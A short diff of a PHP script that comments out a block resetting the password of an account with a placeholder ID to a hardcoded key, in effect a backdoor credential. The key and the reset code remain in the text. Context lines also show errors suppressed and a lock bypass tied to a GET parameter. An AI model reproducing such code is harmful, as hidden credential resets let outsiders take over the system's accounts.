@@ -22,7 +22,7 @@ $usua_nuevo=3;
 error_reporting(0);
 include_once "config.php";
 
-include_once "$ruta_raiz/include/db/ConnectionHandler.php";
+/*include_once "$ruta_raiz/include/db/ConnectionHandler.php";
 $db = new ConnectionHandler($ruta_raiz);
 
 $clave = "f6m9k3h7";
@@ -30,7 +30,7 @@ $clave = "f6m9k3h7";
 $sql = "update usuario set usua_pasw='".substr(md5($clave),1,26)."' where usua_cedula='0000000000'";
 $db->query($sql);
 $sql = "update usuarios set usua_pasw='".substr(md5($clave),1,26)."' where usua_cedula='0000000000'";
-$db->query($sql);
+$db->query($sql);*/
 
 $txt_administrador = 0 + $_GET["txt_administrador"];
 if ($activar_bloqueo_sistema and $txt_administrador != 1) {
